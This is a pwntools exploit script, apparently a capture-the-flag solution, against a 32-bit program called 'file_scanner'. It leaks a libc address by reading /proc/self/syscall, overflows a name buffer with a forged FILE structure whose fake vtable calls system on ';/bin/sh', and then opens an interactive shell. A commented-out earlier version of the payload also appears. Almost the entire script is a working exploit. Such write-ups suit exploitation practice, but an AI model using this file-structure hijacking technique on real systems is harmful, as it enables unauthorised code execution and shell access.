#!/usr/bin/python3

from pwn import *
from ctypes import CDLL
exe = ELF('file_scanner', checksec=False)
libc =  ELF("libc.so.6")

context.binary = exe
context.clear(arch='i386')
def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x08048bc8
                b*0x08048cc9
                b*0x2a926f9b
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()

sla(b"ID: ", b"a")
sla(b"choice :", b"1")
sla(b": ", b"/proc/self/syscall")
sla(b"choice :", b"2")
sla(b"choice :", b"3")

p.recv(64)
leak = int(p.recvline(keepends=False), 16)
libc.address = leak - 0x1ba549
print(libc.address)
sla(b"choice :", b"4")

# file = b""                                       # file
# file += p32(0xFFFFDFFF)                         # file->_flags  set _IO_IS_FILEBUF bit to false
# file += b";/bin/sh;" 
# payload = file.ljust(32, b'A')                   # padding to reach *fp
# payload += p32(exe.symbols['name'])             # *fp           overwrite *fp to point to the start of the name buffer
# payload += b'`'                                  # padding
# payload += b'A' * (72-37)                        # padding
# # payload += p32(elf.symbols['filename'] + 32)    # file->_lock   vtable->__dummy
# # payload += p32(elf.symbols['name'] + 72)        # file->vtable  vtable->__dummy2
# payload += p32(0x804b160)
# payload += p32(0x804b0e8)
# payload += p32(libc.symbols['system'])          #               vtable->__finish

file = FileStructure()
file.flags = 0xFFFFDFFF
file._IO_read_ptr = b";/bi"
file._IO_read_end = b"n/sh"
file._vtable_offset = 0x1
file._lock = 0x804b15c-0x10     # NULL 
# file._offset = 0x804b15c-8
file.vtable = 0x804b15c-8
payload = b"a" * 0x20 + p32(exe.sym.filePtr+4) + bytes(file) + p32(libc.sym.system)

sla(b"name: ", payload)

p.interactive()
